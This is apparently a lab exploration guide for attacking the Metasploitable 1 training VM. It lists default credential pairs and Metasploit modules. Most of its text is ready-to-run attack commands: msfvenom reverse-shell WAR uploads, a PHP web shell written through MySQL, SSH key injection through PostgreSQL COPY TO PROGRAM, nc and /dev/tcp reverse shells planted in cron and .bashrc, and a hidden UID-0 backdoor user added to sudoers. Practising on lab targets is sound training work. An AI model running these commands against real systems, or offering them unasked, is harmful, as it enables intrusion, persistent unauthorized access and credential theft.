Metasploitable 1 - Additional Exploration Guide

HTTP & Tomcat Exploitation

Port 80 - Apache HTTP EASY

Enumeration:

curl -I http://192.168.105.3:80 nikto -h 192.168.105.3 -p 80
Common Vulnerabilities: Outdated Apache, unpatched modules, directory traversal, CGI exploits

Exploitation Path:

msfconsole use auxiliary/scanner/http/dir_scanner set RHOSTS 192.168.105.3 run

Port 8180 - Tomcat Manager MEDIUM

Default Access:

URL: http://192.168.105.3:8180/manager/html Username: tomcat Password: tomcat

If that fails, try:

  • tomcat:s3cret
  • admin:admin
  • admin:password

Exploitation - WAR Upload:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.105.X LPORT=4444 -f war -o shell.war # Then upload shell.war via Tomcat Manager GUI
Alternative (MSF): exploit/multi/http/tomcat_mgr_upload

Post-Upload Shell Access:

nc -lvnp 4444 # Then access: http://192.168.105.3:8180/shell/

Port 3306 - HTTP-RPC (Distcc) HARD

Vulnerability: Distributed compiler with no auth

msfconsole use exploit/unix/misc/distcc_exec set RHOSTS 192.168.105.3 exploit

Database Exploitation

MySQL (Port 3306) EASY

Enumeration:

nmap -p 3306 -sV 192.168.105.3 mysql -h 192.168.105.3 -u root mysql -h 192.168.105.3 -u root -p (if prompted)

Common Credentials:

  • root: (no password)
  • root:root
  • root:password

If Access Granted:

show databases; use mysql; select user,password from user; show tables;
Privilege Escalation via MySQL: Write shell to webroot
SELECT "whoami" INTO OUTFILE "/var/www/html/shell.php"; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

PostgreSQL (Port 5432) EASY

Connection:

psql -h 192.168.105.3 -U postgres psql -h 192.168.105.3 -U postgres -W (for password prompt)

Default Credentials:

  • postgres: (no password)
  • postgres:password

Exploitation:

\l (list databases) \du (list users) \dt (list tables) -- Copy SSH key into authorized_keys COPY (SELECT 'your-public-key') TO PROGRAM 'echo your-public-key >> /root/.ssh/authorized_keys';
Requires: PostgreSQL running with COPY TO PROGRAM enabled (often default on old versions)

Post-Exploitation & Privilege Escalation

System Enumeration EASY

Basic Reconnaissance:

whoami id uname -a cat /etc/os-release cat /etc/passwd sudo -l

Automated Enumeration:

wget http://192.168.105.X/linpeas.sh -O /tmp/linpeas.sh bash /tmp/linpeas.sh
Note: Host linpeas.sh on your Kali machine: python3 -m http.server 8000

Kernel Exploitation HARD

Vulnerable Kernels (Linux 2.6.x):

  • CVE-2009-2698 (udev)
  • CVE-2010-3904 (RDS privilege escalation)
  • CVE-2010-0415 (CAN BCM privilege escalation)
msfconsole use exploit/linux/local/udev_netlink set SESSION 1 exploit

SUID Binary Hunting MEDIUM

find / -perm -4000 2>/dev/null find / -perm -2000 2>/dev/null

Check for writable SUID binaries or library injection:

ls -la /usr/bin/nmap strings /usr/bin/nmap | grep -i library
Common Vuln: Old nmap versions had interactive mode that allowed shell escape

Cron Job Exploitation MEDIUM

cat /etc/crontab ls -la /etc/cron.d/ ps aux | grep cron

If writable cron script found:

echo "nc -e /bin/bash 192.168.105.X 5555" >> /vulnerable/cron/script.sh

Persistence & Maintaining Access

SSH Key Injection EASY

From Your Shell (as compromised user):

mkdir -p ~/.ssh echo "ssh-rsa AAAA... your-public-key" >> ~/.ssh/authorized_keys chmod 600 ~/.ssh/authorized_keys

From Kali (generate key pair):

ssh-keygen -t rsa -N "" -f /tmp/metasploit_key cat /tmp/metasploit_key.pub

Then SSH back:

ssh -i /tmp/metasploit_key msfadmin@192.168.105.3

Backdoor User Creation MEDIUM

# Create user with UID 0 (root) useradd -m -p $(openssl passwd -1 password123) -u 0 -o backdoor # Or add to sudoers: echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
Risk: May be detected by auditing tools. Use with caution.

Reverse Shell Upgrade EASY

python -c 'import pty; pty.spawn("/bin/bash")' # or bash -i >& /dev/tcp/192.168.105.X/4444 0>&1

On Kali listener:

nc -lvnp 4444 # Then upgrade shell: export TERM=xterm stty raw -echo fg

Rootkit/Backdoor Installation HARD

Simple persistence via .bashrc/.profile:

echo "bash -i >& /dev/tcp/192.168.105.X/9999 0>&1 &" >> ~/.bashrc

System-wide persistence:

echo "* * * * * /usr/bin/nc 192.168.105.X 9999 -e /bin/bash" | crontab -
Advanced: Use msfvenom to generate persistent payloads
